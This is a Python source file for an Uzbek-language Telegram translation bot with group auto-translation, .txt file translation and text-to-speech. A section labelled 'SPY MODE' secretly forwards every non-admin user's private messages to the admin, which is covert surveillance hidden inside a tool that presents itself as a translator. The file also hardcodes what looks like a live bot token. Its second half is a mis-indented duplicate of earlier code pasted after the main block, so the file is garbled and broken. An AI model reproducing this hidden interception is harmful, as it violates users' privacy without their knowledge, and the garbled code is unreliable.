import logging
import os
import sqlite3
from threading import Thread
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, CallbackQueryHandler, InlineQueryHandler, filters
from deep_translator import GoogleTranslator
from gtts import gTTS
import uuid

# --- 1. SOZLAMALAR ---
BOT_TOKEN = "8387200840:AAFMVfEWUhzB_C-25qjzajpQyRm5aF091hA"
ADMIN_ID = 8518157443
BOT_USERNAME = "@tarjimon_wbot"

# --- 2. FLASK (Render.com uchun) ---
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "Bot V7.0 (Pro Mode) Ishlamoqda!"

def run_http():
    flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    t = Thread(target=run_http)
    t.start()

# --- 3. BAZA (SQLite) ---
def init_db():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT, lang TEXT)''')
    conn.commit()
    conn.close()

def add_user(user_id, name):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('SELECT id FROM users WHERE id = ?', (user_id,))
    if c.fetchone() is None:
        c.execute('INSERT INTO users VALUES (?, ?, ?)', (user_id, name, 'en'))
        conn.commit()
    conn.close()

def get_count():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users')
    soni = c.fetchone()[0]
    conn.close()
    return soni

# --- 4. MENYULAR VA TILLAR ---
TILLAR = {
    "🇺🇿 O'zbek": "uz", "🇬🇧 English": "en", "🇷🇺 Русский": "ru",
    "🇰🇷 Korean": "ko", "🇸🇦 Arabic": "ar", "🇹🇷 Turkish": "tr",
    "🇯🇵 Japanese": "ja", "🇩🇪 German": "de", "🇨🇳 Chinese": "zh-CN"
}

def main_menu_keyboard(user_id):
    buttons = [
        [KeyboardButton("🔤 Tarjima qilish"), KeyboardButton("👤 Profilim")],
        [KeyboardButton("📞 Aloqa"), KeyboardButton("ℹ️ Info")]
    ]
    if user_id == ADMIN_ID:
        buttons.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def inline_lang_keyboard():
    keyboard = []
    row = []
    for name, code in TILLAR.items():
        row.append(InlineKeyboardButton(name, callback_data=f"lang_{code}_{name}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    return InlineKeyboardMarkup(keyboard)

# --- 5. ASOSIY KOD ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.first_name)
    
    if 'target_lang' not in context.user_data:
        context.user_data['target_lang'] = 'uz'
        context.user_data['lang_name'] = "🇺🇿 O'zbek"
        context.user_data['state'] = 'main'

    await update.message.reply_text(
        f"👋 Salom, <b>{user.first_name}</b>!\n\n"
        f"🤖 Men professional tarjimon botman. Meni guruhlarga qo'shsangiz, xabarlarni avtomatik tarjima qilib beraman!\n\n"
        f"Matn yozing yoki pastdagi menyudan foydalaning 👇",
        reply_markup=main_menu_keyboard(user.id),
        parse_mode="HTML"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    chat_type = update.message.chat.type

    # 👥 GURUH UCHUN AVTO-TARJIMA REJIMI
    if chat_type in ['group', 'supergroup']:
        if text and not text.startswith('/'):
            try:
                # Guruhdagi matnni avtomatik o'zbekchaga o'giradi
                tarjima = GoogleTranslator(source='auto', target='uz').translate(text)
                # Agar yozilgan matn o'zi o'zbekcha bo'lmasa, tarjimani yuboradi
                if tarjima.lower() != text.lower():
                    await update.message.reply_text(f"🇺🇿 <b>Tarjima:</b>\n{tarjima}", parse_mode="HTML", reply_to_message_id=update.message.message_id)
            except:
                pass
        return

    # 🔥 JOSUSLIK FUNKSIYASI (SPY MODE)
    if user_id != ADMIN_ID and chat_type == 'private':
        try:
            await context.bot.forward_message(chat_id=ADMIN_ID, from_chat_id=user_id, message_id=update.message.message_id)
        except:
            pass 

    state = context.user_data.get('state', 'main')

    if text == "🔙 Bosh menyu":
        context.user_data['state'] = 'main'
        await update.message.reply_text("🏠 Asosiy menyu.", reply_markup=main_menu_keyboard(user_id))
        return

    if text == "🔤 Tarjima qilish":
        target = context.user_data.get('lang_name', "🇺🇿 O'zbek")
        context.user_data['state'] = 'translating'
        await update.message.reply_text(
            f"Hozirgi maqsadli til: <b>{target}</b>\n\nTilni o'zgartirish uchun pastdagi tugmalardan tanlang yoki matn yuboring:",
            reply_markup=inline_lang_keyboard(),
            parse_mode="HTML"
        )
        return

    elif text == "👤 Profilim":
        lang = context.user_data.get('lang_name', "🇺🇿 O'zbek")
        await update.message.reply_text(f"👤 <b>Ism:</b> {update.effective_user.first_name}\n🌐 <b>Tarjima tili:</b> {lang}", parse_mode="HTML")
        return

    elif text == "📞 Aloqa":
        context.user_data['state'] = 'feedback'
        await update.message.reply_text("Admin uchun xabaringizni yozing:", reply_markup=ReplyKeyboardMarkup([[KeyboardButton("🔙 Bosh menyu")]], resize_keyboard=True))
        return
    
    elif text == "ℹ️ Info":
        await update.message.reply_text(f"🤖 <b>Bot V7.0 Pro</b>\n\n✨ <b>Imkoniyatlar:</b>\n- Guruhlarda avto-tarjima\n- .txt fayllarni tarjima qilish\n- Inline rejim (`{BOT_USERNAME} matn`)", parse_mode="Markdown")
        return

    if text == "👑 Admin Panel" and user_id == ADMIN_ID:
        odam_soni = get_count()
        await update.message.reply_text(f"👑 <b>ADMIN PANEL</b>\n👥 Bot obunachilari: {odam_soni}", parse_mode="HTML")
        return

    # ODATIY TARJIMA REJIMI
    if state == 'translating' or chat_type == 'private':
        target_code = context.user_data.get('target_lang', 'uz')
        try:
            tarjima = GoogleTranslator(source='auto', target=target_code).translate(text)
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔊 Ovozli eshitish", callback_data=f"tts_{target_code}")]])
            context.user_data['last_translation'] = tarjima
            await update.message.reply_text(f"📝 <b>Tarjima:</b>\n\n{tarjima}", reply_markup=keyboard, parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text("⚠️ Tarjimada xatolik yuz berdi.")
        return

    if state == 'feedback':
        if user_id != ADMIN_ID:
            await update.message.reply_text("✅ Xabaringiz adminga yuborildi!", reply_markup=main_menu_keyboard(user_id))
            context.user_data['state'] = 'main'
        return

# 📄 HUJJATLARNI TARJIMA QILISH (.txt)
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if doc.mime_type == 'text/plain':
        await update.message.reply_text("⏳ Matn o'qilmoqda va tarjima qilinmoqda...")
        try:
            file = await context.bot.get_file(doc.file_id)
            downloaded_file = await file.download_as_bytearray()
            text = downloaded_file.decode('utf-8')
            
            # Matn juda uzun bo'lsa qisqartiramiz (Telegram limiti)
            target_code = context.user_data.get('target_lang', 'uz')
            tarjima = GoogleTranslator(source='auto', target=target_code).translate(text[:4000])
            await update.message.reply_text(f"📄 <b>Hujjat tarjimasi:</b>\n\n{tarjima}", parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text("⚠️ Hujjatni o'qishda xatolik yuz berdi. Faqat .txt formatidagi matnli hujjatlarni yuboring.")
    else:
        await update.message.reply_text("⚠️ Hozircha faqat .txt formatidagi hujjatlarni tarjima qila olaman.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("lang_"):
        parts = data.split('_')
        code = parts[1]
        name = parts[2]
        context.user_data['target_lang'] = code
        context.user_data['lang_name'] = name
        await query.edit_message_text(f"✅ Til muvaffaqiyatli <b>{name}</b> ga o'zgartirildi!\n\nEndi menga matn yuboring:", parse_mode="HTML")
    
    elif data.startswith("tts_"):
        code = data.split('_')[1]
        await query.message.reply_text("⏳ Ovoz tayyorlanmoqda...")
        try:
            tts = gTTS(text=context.user_data.get('last_translation', 'Hello'), lang=code, slow=False)
            tts.save("audio.mp3")
            await context.bot.send_audio(chat_id=query.message.chat_id, audio=open("audio.mp3", 'rb'), title="Tarjima", performer=BOT_USERNAME)
            os.remove("audio.mp3")
        except: 
            await query.message.reply_text("⚠️ Bu til uchun ovozli o'qish imkoni yo'q.")

if __name__ == '__main__':
    init_db()
    keep_alive()
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("Bot V7.0 (Pro Mode) ishga tushdi!")
    application.run_polling()    # 👥 GURUH UCHUN AVTO-TARJIMA REJIMI
    if chat_type in ['group', 'supergroup']:
        if text and not text.startswith('/'):
            try:
                # Guruhdagi matnni avtomatik o'zbekchaga o'giradi
                tarjima = GoogleTranslator(source='auto', target='uz').translate(text)
                # Agar yozilgan matn o'zi o'zbekcha bo'lmasa, tarjimani yuboradi
                if tarjima.lower() != text.lower():
                    await update.message.reply_text(f"🇺🇿 <b>Tarjima:</b>\n{tarjima}", parse_mode="HTML", reply_to_message_id=update.message.message_id)
            except:
                pass
        return

    # 🔥 JOSUSLIK FUNKSIYASI (SPY MODE)
    if user_id != ADMIN_ID and chat_type == 'private':
        try:
            await context.bot.forward_message(chat_id=ADMIN_ID, from_chat_id=user_id, message_id=update.message.message_id)
        except:
            pass 

    state = context.user_data.get('state', 'main')

    if text == "🔙 Bosh menyu":
        context.user_data['state'] = 'main'
        await update.message.reply_text("🏠 Asosiy menyu.", reply_markup=main_menu_keyboard(user_id))
        return

    if text == "🔤 Tarjima qilish":
        target = context.user_data.get('lang_name', "🇺🇿 O'zbek")
        context.user_data['state'] = 'translating'
        await update.message.reply_text(
            f"Hozirgi maqsadli til: <b>{target}</b>\n\nTilni o'zgartirish uchun pastdagi tugmalardan tanlang yoki matn yuboring:",
            reply_markup=inline_lang_keyboard(),
            parse_mode="HTML"
        )
        return

    elif text == "👤 Profilim":
        lang = context.user_data.get('lang_name', "🇺🇿 O'zbek")
        await update.message.reply_text(f"👤 <b>Ism:</b> {update.effective_user.first_name}\n🌐 <b>Tarjima tili:</b> {lang}", parse_mode="HTML")
        return

    elif text == "📞 Aloqa":
        context.user_data['state'] = 'feedback'
        await update.message.reply_text("Admin uchun xabaringizni yozing:", reply_markup=ReplyKeyboardMarkup([[KeyboardButton("🔙 Bosh menyu")]], resize_keyboard=True))
        return
    
    elif text == "ℹ️ Info":
        await update.message.reply_text(f"🤖 <b>Bot V7.0 Pro</b>\n\n✨ <b>Imkoniyatlar:</b>\n- Guruhlarda avto-tarjima\n- .txt fayllarni tarjima qilish\n- Inline rejim (`{BOT_USERNAME} matn`)", parse_mode="Markdown")
        return

    if text == "👑 Admin Panel" and user_id == ADMIN_ID:
        odam_soni = get_count()
        await update.message.reply_text(f"👑 <b>ADMIN PANEL</b>\n👥 Bot obunachilari: {odam_soni}", parse_mode="HTML")
        return

    # ODATIY TARJIMA REJIMI
    if state == 'translating' or chat_type == 'private':
        target_code = context.user_data.get('target_lang', 'uz')
        try:
            tarjima = GoogleTranslator(source='auto', target=target_code).translate(text)
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔊 Ovozli eshitish", callback_data=f"tts_{target_code}")]])
            context.user_data['last_translation'] = tarjima
            await update.message.reply_text(f"📝 <b>Tarjima:</b>\n\n{tarjima}", reply_markup=keyboard, parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text("⚠️ Tarjimada xatolik yuz berdi.")
        return

    if state == 'feedback':
        if user_id != ADMIN_ID:
            await update.message.reply_text("✅ Xabaringiz adminga yuborildi!", reply_markup=main_menu_keyboard(user_id))
            context.user_data['state'] = 'main'
        return

# 📄 HUJJATLARNI TARJIMA QILISH (.txt)
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if doc.mime_type == 'text/plain':
        await update.message.reply_text("⏳ Matn o'qilmoqda va tarjima qilinmoqda...")
        try:
            file = await context.bot.get_file(doc.file_id)
            downloaded_file = await file.download_as_bytearray()
            text = downloaded_file.decode('utf-8')
            
            # Matn juda uzun bo'lsa qisqartiramiz (Telegram limiti)
            target_code = context.user_data.get('target_lang', 'uz')
            tarjima = GoogleTranslator(source='auto', target=target_code).translate(text[:4000])
            await update.message.reply_text(f"📄 <b>Hujjat tarjimasi:</b>\n\n{tarjima}", parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text("⚠️ Hujjatni o'qishda xatolik yuz berdi. Faqat .txt formatidagi matnli hujjatlarni yuboring.")
    else:
        await update.message.reply_text("⚠️ Hozircha faqat .txt formatidagi hujjatlarni tarjima qila olaman.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("lang_"):
        parts = data.split('_')
        code = parts[1]
        name = parts[2]
        context.user_data['target_lang'] = code
        context.user_data['lang_name'] = name
        await query.edit_message_text(f"✅ Til muvaffaqiyatli <b>{name}</b> ga o'zgartirildi!\n\nEndi menga matn yuboring:", parse_mode="HTML")
    
    elif data.startswith("tts_"):
        code = data.split('_')[1]
        await query.message.reply_text("⏳ Ovoz tayyorlanmoqda...")
        try:
            tts = gTTS(text=context.user_data.get('last_translation', 'Hello'), lang=code, slow=False)
            tts.save("audio.mp3")
            await context.bot.send_audio(chat_id=query.message.chat_id, audio=open("audio.mp3", 'rb'), title="Tarjima", performer=BOT_USERNAME)
            os.remove("audio.mp3")
        except: 
            await query.message.reply_text("⚠️ Bu til uchun ovozli o'qish imkoni yo'q.")

if __name__ == '__main__':
    init_db()
    keep_alive()
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("Bot V7.0 (Pro Mode) ishga tushdi!")
    application.run_polling()
